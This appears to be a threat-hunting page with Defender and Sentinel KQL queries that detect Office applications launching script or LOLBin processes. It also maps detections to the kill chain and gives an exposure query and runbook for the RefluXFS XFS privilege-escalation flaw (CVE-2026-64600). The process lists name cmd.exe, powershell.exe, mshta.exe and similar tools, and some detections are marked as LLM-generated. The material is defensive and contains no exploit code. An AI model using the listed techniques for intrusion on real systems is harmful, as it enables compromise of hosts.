Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

Nine-Year-Old RefluXFS Linux Flaw Gives Local Users Root on Default RHEL Installs

The Hacker News
2026-07-23 15 use cases 7 techniques 5 kill-chain phases detected

RefluXFS, a new Linux kernel flaw disclosed on July 22 and tracked as CVE-2026-64600, lets an unprivileged local user overwrite root-owned files on an XFS filesystem and gain persistent root access. Qualys said default installations of Red Hat Enterprise Linux and its derivatives, Fedora Server, and Amazon Linux can meet the conditions for exploitation. The company demonstrated the race

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Exposed hosts vulnerable to RefluXFS XFS reflink LPE (CVE-2026-64600) · [LLM] chsh spawned from user-writable path (RefluXFS reflink-unshare reset primitive) · Office app spawning script/LOLBin child process · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Auth-less root shell without sudo/su/pkexec lineage (RefluXFS post-exploitation) · Suspicious browser extension installation · Article-specific behavioural hunt — Nine-Year-Old RefluXFS Linux Flaw Gives Local Users Root on Default RHEL Install
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · OAuth consent / suspicious app grant · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Exposed hosts vulnerable to RefluXFS XFS reflink LPE (CVE-2026-64600) AIExploitation High
Surfaces RHEL/Fedora/Oracle/Rocky/Alma/Amazon Linux endpoints still running an unpatched kernel carrying CVE-2026-64600, the XFS reflink copy-on-write race that hands any local user root. Prioritises multi-tenant / shell-accessible hosts where untrusted code can run, since Qualys states there is no runtime mitigation and only a fixed kernel + reboot closes it. Rationale: Anchors on the exact CVE id (CVE-2026-64600) confirmed by Qualys and the Red Hat customer portal; TVM vuln tables are the only high-fidelity way to enumerate the unpatched-kernel exposure the article's entire 'Who is exposed / Patch, then reboot' section is about. Cross-checked against: • https://blog.qualys.com/vulnerabilities-threat-research/2026/07/22/refluxfs-a-linux-kernel-local-privilege-escalation-to-root-in-xfs-cve-2026-64600 • https://access.redhat.com/solutions/7145752 • https://cybersecuritynews.com/refluxfs-linux-kernel-vulnerability/
ATT&CKT1068
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Host already patched but TVM inventory stale before next scan (fixed kernel installed, not yet rebooted) — matches the article's 'installing the package does not replace the running kernel' caveat
  • RHEL 7 filesystems flagged that actually predate XFS reflink and are not exploitable
  • Hosts where root XFS was created without reflink=1 (condition two unmet) still listed by CVE match
  • Extended-support/SAP streams reporting the CVE before their stream-specific errata lands
  • Container images inheriting the CVE from a base layer but running read-only / no local shell
Suppression filter
| where SoftwareVersion !has "el7" and OSVersion !startswith "7."
Response runbook
1) Triage: for each hit run `xfs_info / | grep reflink=` (and on other mounted XFS volumes) to confirm reflink=1 and that a protected file + attacker-writable dir share the FS; cross-check the installed kernel against the stream-specific errata (RHSA-2026:39179/39180 for RHEL 8, RHSA-2026:39494 for RHEL 10). 2) Contain: prioritise multi-tenant / CI / internet-facing hosts — apply the vendor kernel update and REBOOT, then verify `uname -r` is the fixed build; restrict untrusted local execution meanwhile. 3) Hunt: on confirmed-exposed hosts pivot to the chsh-reset and auth-less-root detections below to check for prior exploitation.

| where CveId == "CVE-2026-64600"
| join kind=leftouter (DeviceInfo | where Timestamp > ago(1d) | summarize arg_max(Timestamp, IsInternetFacing, LoggedOnUsers, OSDistribution) by DeviceId) on DeviceId
| project DeviceName, DeviceId, OSPlatform, OSDistribution, OSVersion, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate, IsInternetFacing, LoggedOnUsers
| order by IsInternetFacing desc, DeviceName asc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId == "CVE-2026-64600"
| summarize arg_max(TimeGenerated, *) by DeviceId, SoftwareName
| project TimeGenerated, DeviceName, DeviceId, OSPlatform, OSVersion, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
